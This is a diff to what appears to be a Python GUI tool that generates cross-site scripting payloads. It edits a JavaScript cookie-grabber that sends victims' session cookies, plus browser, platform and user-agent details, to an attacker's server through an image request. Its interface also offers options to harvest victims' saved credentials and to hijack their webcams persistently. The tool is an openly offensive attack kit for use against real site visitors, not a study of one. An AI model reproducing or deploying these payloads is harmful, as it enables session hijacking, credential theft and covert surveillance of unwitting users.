@@ -329,7 +329,7 @@ req.send();
 '''
 
         cookie_grabber_code = '''function InterceptForm() {
-new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+document.cookie;
+new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+"Browser: [" + navigator.appName + "] Browser Version: [" + navigator.appVersion + "] Operating System: [" + navigator.platform + "] User Agent: [" + navigator.userAgent + "] Cookie: [" + document.cookie + "] Java Enabled: [" + navigator.javaEnabled + "]";
 }       
 window.addEventListener("load", InterceptForm());
 
@@ -491,7 +491,7 @@ link.click();
     xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Get victim's saved credentials on the website                                                        ", variable=xss_xhr_harvester_var)
     xss_xhr_harvester.grid(row=4, column=0)
 
-    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                               ", variable=xss_cookie_grabber_var)
+    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Gather victim information                                                                                        ", variable=xss_cookie_grabber_var)
     xss_cookie_grabber.grid(row=5, column=0)
 
     xss_webcam = tk.Checkbutton(root2_frame, text="Persistent webcam hijacking (requires permission)                                                ",variable=xss_webcam_var, command=refresh_webcam_status)
